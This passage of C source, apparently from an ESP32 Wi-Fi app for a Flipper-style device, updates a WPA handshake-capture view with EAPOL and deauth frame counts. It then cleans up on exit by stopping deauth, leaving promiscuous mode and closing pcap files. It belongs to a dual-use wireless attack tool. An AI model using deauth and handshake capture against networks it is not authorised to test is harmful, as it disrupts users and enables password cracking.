            m->has_m4 = s_single.has_m4;
            m->complete = app->handshake_complete;
            m->eapol_count = app->handshake_eapol_count;
            m->deauth_frames = app->handshake_deauth_count;
            if(app->handshake_running) {
                m->elapsed_sec = (uint32_t)(esp_timer_get_time() / 1000000) - s_start_us;
            }
            view_commit_model(app->view_handshake, true);
        }
    }

    return consumed;
}

void wlan_app_scene_handshake_on_exit(void* context) {
    WlanApp* app = context;

    if(s_hsc_dialog_open) {
        widget_reset(app->widget);
        s_hsc_dialog_open = false;
    }

    if(app->handshake_deauth_running) hs_stop_deauth(app);

    if(app->handshake_running || s_hs_running) {
        wlan_hal_set_promiscuous(false, NULL);
        if(s_use_channel_mode) {
            hsc_drain_and_process(app);
        } else {
            hs_drain_and_process(app);
        }
    } else {
        wlan_hal_set_promiscuous(false, NULL);
    }

    if(s_use_channel_mode) {
        hsc_close_pcaps();
        hsc_clear_targets();
    } else {
        if(s_single_pcap) {
            wlan_pcap_close(s_single_pcap);
            s_single_pcap = NULL;
        }
    }

    if(s_storage) {
        furi_record_close(RECORD_STORAGE);
        s_storage = NULL;
    }

    if(s_pkt_pool) {
        free(s_pkt_pool);
        s_pkt_pool = NULL;
    }

    s_hs_running = false;
    s_hsc_grace_until = 0;
    s_hsc_auto_mode = false;
    s_hsc_ok_held = false;
    app->handshake_running = false;
    app->handshake_deauth_running = false;
}
